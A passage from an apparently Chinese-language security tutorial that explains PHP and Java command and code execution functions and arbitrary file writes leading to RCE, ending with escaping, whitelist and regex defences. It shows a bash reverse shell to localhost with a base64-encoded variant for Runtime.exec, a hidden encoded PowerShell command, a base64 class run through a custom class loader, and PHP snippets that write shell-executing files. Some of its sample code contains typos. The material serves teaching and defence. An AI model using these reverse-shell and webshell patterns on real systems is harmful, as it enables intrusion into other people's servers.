invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>执行PHP代码</strong>的命令如下：</p><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>用于执行一个字符串作为 PHP 代码。可以执行任何有效的 PHP 代码片段。没有返回值，除非在执行的代码中明确返回</p><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>用于测试一个表达式是否为真。如果表达式为假，会抛出一个警告或异常（取决于 PHP 配置）。通常用于调试和测试目的</p><p><strong>注意！！！</strong>此函数在在PHP8已经被移除了，以下是官方介绍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span><span class="hljs-variable">$assertion</span>, <span class="hljs-built_in">Throwable</span>|<span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$description</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>assertion可以是任何带返回值的表达式，运行后的结果用于表示断言成功还是失败。警告在 PHP 8.0.0 之前，如果assertion 是 <code>string</code>，将解释为 PHP 代码，并通过 <code>eval()</code> 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除</p><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h4><p>用于调用一个回调函数，该函数可以是一个函数名或闭包。可以传递多个参数给回调函数。返回回调函数的返回值。适用于动态函数调用</p><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>用于创建匿名（lambda-style）函数。接受两个字符串参数：参数列表和函数体。返回一个匿名函数的引用</p><p><strong>注意！！！</strong>同assert，已在PHP7.2弃用，PHP8.0被移除</p><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h4><p>用于将回调函数应用于数组的每个元素。接受一个回调函数和一个或多个数组。返回一个新数组，数组元素是回调函数应用于原始元素的结果。适用于转换或处理数组元素</p><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h4><p>用于调用回调函数，并将参数作为数组传递。接受两个参数：回调函数和参数数组。返回回调函数的返回值。适用于动态参数数量的函数调用</p><h4 id="usort"><a href="#usort" class="headerlink" title="usort"></a>usort</h4><p>用于对数组进行自定义排序，接受数组和比较函数作为参数。比较函数确定元素间的排序顺序，排序后的数组不保留原始键名。适用于根据用户定义的规则排序数组元素</p><h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h4><p>用于过滤数组元素，接受数组和可选的回调函数作为参数。如果提供回调函数，仅包含回调返回真值的元素；否则，移除所有等同于false的元素。适用于基于条件移除数组中的元素</p><h4 id="array-reduce"><a href="#array-reduce" class="headerlink" title="array_reduce"></a>array_reduce</h4><p>用于迭代一个数组，并通过回调函数将数组的元素逐一减少到单一值。接受三个参数：一个数组、一个回调函数和一个可选的初始值。回调函数接受两个参数：一个是携带结果的累加器，另一个是当前数组元素。返回通过累加器得到的最终值</p><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><p>用于执行正则表达式的搜索和替换。接受三个参数：模式（正则表达式）、替换值和目标字符串。可以是单个字符串或数组。返回修改后的字符串或数组。适用于基于模式匹配修改文本内容。(&#x2F;e的代码执行版本在5.6版本后被移除)</p><h4 id="符号"><a href="#符号" class="headerlink" title="$符号"></a>$符号</h4><p>在 PHP 中，<code>$&#123;&#125;</code> 语法本质上是用于复杂的变量解析，通常在字符串内用来解析变量或表达式。然而，在一些特殊情况下，如果配合 eval 或其他动态执行代码的功能，<code>$&#123;&#125;</code> 可以被用来间接执行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//eval</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;system(whoami);&#x27;</span>);<br><span class="hljs-comment">//assert</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&#x27;system(whoami)&#x27;</span>);<br><span class="hljs-comment">//call_user_func</span><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&#x27;system(whoami)&#x27;</span>);<br><span class="hljs-comment">//create_function</span><br><span class="hljs-variable">$command1</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;system(whoami);&#x27;</span>);<br><span class="hljs-variable">$command1</span>();<br><span class="hljs-comment">//array_map</span><br><span class="hljs-variable">$command2</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-variable">$command2</span>);<br><span class="hljs-comment">//call_user_func_array</span><br><span class="hljs-variable">$command3</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$arguments</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$command3</span>,<span class="hljs-variable">$arguments</span>);<br><span class="hljs-comment">//usort</span><br><span class="hljs-variable">$command4</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>];<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$commnand4</span>,<span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-comment">//array_filter</span><br><span class="hljs-variable">$command5</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_filter</span>(command5,<span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JAVA基础命令-代码执行函数"><a href="#JAVA基础命令-代码执行函数" class="headerlink" title="JAVA基础命令&#x2F;代码执行函数"></a>JAVA基础命令&#x2F;代码执行函数</h3><p>JAVA下直接执行<strong>系统命令</strong>的函数如下</p><h4 id="Runtime-getRuntime-exec"><a href="#Runtime-getRuntime-exec" class="headerlink" title="Runtime.getRuntime().exec"></a>Runtime.getRuntime().exec</h4><p><strong>注意！！！</strong></p><p>但与php不同的是，java会将其中的参数当成一整个字符串来执行，而不会受到shell符号的影响</p><p><code>Runtime.exec</code>类型的RCE如果要反弹shell需要特殊处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">原命令：<br>bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">12345</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>处理后：<br>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNDUgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>对于powershell应该是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc YwBhAGwAYwAuAGUAeABlAA==<br></code></pre></td></tr></table></figure><h4 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h4><p>这个函数与<code>Runtime.getRuntime().exec</code>区别在于它是传参更加方便，并且它允许更精细的控制进程的创建，包括环境变量的设置、工作目录的改变以及更复杂的输入输出处理</p><p>Java代码执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;ping&quot;</span> , <span class="hljs-string">&quot;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意！！！</strong></p><p>代码执行相当于字节码执行，一个弹计算器的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Main</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后使用<code>javac Main.java</code>编译成字节码文件</p><p>使用下面的代码进行base64编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">compile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C://Users//95658//Desktop//ctf_challenges-master//Test1//src//Main.class&quot;</span>);<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> n;<br>        <span class="hljs-keyword">while</span> ((n = fis.read(buf)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(buf, <span class="hljs-number">0</span>, n);        &#125;<br>        fis.close();<br>        <span class="hljs-type">byte</span>[] classBytes = baos.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(classBytes);<br>        System.out.println(base64);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用下面的代码来解码base64后，使用我们自定义的类加载器执行我们的字节码，可以看到成功的执行了calc弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Excute</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">base64ClassString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAAD0AHAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEABGNhbGMKAAgAEAwAEQASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAFAEABE1haW4BAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAGQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAApTb3VyY2VGaWxlAQAJTWFpbi5qYXZhACEAEwACAAAAAAABAAEABQAGAAIAFQAAAC4AAgABAAAADiq3AAG4AAcSDbYAD1exAAAAAQAWAAAADgADAAAAAgAEAAMADQAEABcAAAAEAAEAGAABABoAAAACABs=&quot;</span>;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] classBytes = Base64.getDecoder().decode(base64ClassString);<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">customClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Main&quot;</span>.equals(name)) &#123;<br>                    <span class="hljs-keyword">return</span> defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.findClass(name);<br>            &#125;<br>        &#125;;<br>        <span class="hljs-comment">// 使用自定义的类加载器来加载我们的Test类</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;Main&quot;</span>, <span class="hljs-literal">true</span>, customClassLoader);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor().newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="修复-预防方案"><a href="#修复-预防方案" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><p>使用安全的过滤函数，例如：<code>escapeshellarg</code>或<code>escapeshellcmd</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;|whoami&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1&quot;</span>.<span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1&quot;</span>.<span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1&quot;</span>.<span class="hljs-variable">$test</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>白名单</code>命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$allowed_commands</span> = [<span class="hljs-string">&#x27;dir&#x27;</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-string">&#x27;echo&#x27;</span>];<br><span class="hljs-variable">$command1</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br><span class="hljs-variable">$command2</span> = <span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$command1</span>,<span class="hljs-variable">$allowed_commands</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$command1</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$command2</span> , <span class="hljs-variable">$allowed_commands</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$command2</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过正则表达式，只运行<code>字母</code>和<code>数字</code>通过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test1</span> = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br><span class="hljs-variable">$test2</span> = <span class="hljs-string">&#x27;whoami|whoami&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-zA-Z0-9]+$/&#x27;</span>, <span class="hljs-variable">$test1</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$test1</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-zA-Z0-9]+$/&#x27;</span>, <span class="hljs-variable">$test2</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$test2</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>而java当中没有php的安全函数，但他本身的命令传参就会防止特殊符号。所以用正则进行控制即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> ...; <span class="hljs-comment">// 从用户或外部源获取的输入</span><br><span class="hljs-keyword">if</span> (!userInput.matches(<span class="hljs-string">&quot;[a-zA-Z0-9]+&quot;</span>)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;不合法的输入&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="任意文件写入导致RCE"><a href="#任意文件写入导致RCE" class="headerlink" title="任意文件写入导致RCE"></a>任意文件写入导致RCE</h2><p>任意文件写入漏洞（Arbitrary File Write Vulnerability），它允许攻击者将数据写入服务器上的文件，甚至创建新文件。这种漏洞通常发生在应用程序不正确地处理文件写入操作时</p><h3 id="PHP任意文件写入方式"><a href="#PHP任意文件写入方式" class="headerlink" title="PHP任意文件写入方式"></a>PHP任意文件写入方式</h3><h4 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h4><p>这个函数用于简单地将一个字符串写入文件，如果文件不存在会尝试创建它。它是一个高级别的操作，相当于依次调用 fopen, fwrite, 和 fclose。可以指定标志来决定是否追加数据到文件或者是覆盖原有的数据。适用于快速简单地写入数据到文件</p><h4 id="fwrite-fputs"><a href="#fwrite-fputs" class="headerlink" title="fwrite&#x2F;fputs"></a>fwrite&#x2F;fputs</h4><p>fwrite与fputs函数用法完全相同</p><p>这个函数用于向一个打开的文件流（例如通过 fopen 获得的资源）写入数据。需要更细粒度的控制文件操作时（例如，持续写入数据到同一个文件），fwrite 更加适用。用于写入数据之前，必须先用 fopen 打开文件并获得文件指针</p><h4 id="fprintf"><a href="#fprintf" class="headerlink" title="fprintf"></a>fprintf</h4><p>类似于 fwrite，但它提供了格式化功能，类似于 printf 函数。允许你按照特定的格式将数据写入到文件流。同样需要一个通过 fopen 打开的文件指针。适用于需要按照特定格式写入数据的场景</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//file_put_contents</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;test1.php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php system(&#x27;whoami&#x27;)?&gt;&quot;</span>);<br><br><span class="hljs-comment">//fwite/fputs</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;test2.php&quot;</span> , <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;&lt;?php system(&#x27;whoami&#x27;)?&gt;&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-comment">//fprintf</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;test3.php&quot;</span> , <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-title function_ invoke__">fprintf</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;&lt;?php stsrem(&#x27;whoami&#x27;)?&gt;&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JAVA任意文件写入方式"><a href="#JAVA任意文件写入方式" class="headerlink" title="JAVA任意文件写入方式"></a>JAVA任意文件写入方式</h3><h4 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h4><p>其是一个用于写入字节到文件的输出流类。它直接写入字节，因此非常适合处理二进制数据，如图像和音频文件。它直接与底层操作系统的文件写入机制交互，没有内置的缓冲机制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test1.jsp&quot;</span>))&#123;<br>            <span class="hljs-type">byte</span>[] bytes = data.getBytes();<br>            fos.write(bytes);<br>        &#125;<span class="hljs-keyword">catch</span>(IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="BufferedOutputStream"><a href="#BufferedOutputStream" class="headerlink" title="BufferedOutputStream"></a>BufferedOutputStream</h4><p><code>BufferedOutputStream</code> 是 <code>OutputStream</code> 的一个子类，它添加了缓冲功能。这意味着数据首先被写入到内存缓冲区，当缓冲区满时，数据才会写入文件。这可以提高文件写入的效率，特别是在多次写入小量数据的场景中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test.jsp&quot;</span>));<br>             <span class="hljs-type">OutputStreamWriter</span> <span class="hljs-variable">osw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(bos, <span class="hljs-string">&quot;UTF-8&quot;</span>)) &#123;<br>            osw.write(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h4><p>FileWriter 用于写入字符数据到文件。它是写入文本数据的便捷方式，特别是当数据是字符串时。它直接将字符数据转换为字节，并写入到文件中。因此，它更适合处理文本数据。FileWriter 基于默认的字符编码。要指定不同的编码，可能需要使用 <code>OutputStreamWriter</code> 与 <code>FileOutputStream</code> 的组合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;test3.jsp&quot;</span>))&#123;<br>            writer.write(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Files-write"><a href="#Files-write" class="headerlink" 